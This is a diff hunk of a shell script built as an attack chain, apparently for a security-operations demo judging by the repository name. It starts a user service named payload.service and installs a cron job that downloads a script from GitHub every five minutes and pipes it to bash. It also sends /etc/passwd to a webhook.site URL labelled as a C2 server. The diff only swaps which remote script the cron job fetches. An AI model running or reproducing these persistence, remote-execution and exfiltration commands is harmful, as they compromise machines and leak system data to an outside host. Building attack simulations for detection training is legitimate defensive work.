@@ -9,7 +9,7 @@ systemctl --user daemon-reload
 systemctl --user start payload.service
 
 #Create crontab download payload.sh file
-(crontab -l 2>/dev/null; echo '*/5 * * * * curl https://raw.githubusercontent.com/Baby-Hunter/thor-apt/refs/heads/main/test.sh | bash /dev/null 2>/dev/null') | crontab -
+(crontab -l 2>/dev/null; echo '*/5 * * * * curl https://raw.githubusercontent.com/Baby-Hunter/demo_attack_SOC/refs/heads/main/update.sh | bash /dev/null 2>/dev/null') | crontab -
 
 #Exfiltrate data from the machine to a C2 server
 cat /etc/passwd | curl -X POST 'https://webhook.site/e1229f93-20a6-4e67-9d24-3a06ba16b080' -H 'Content-Type: text/plain' --data-binary @-
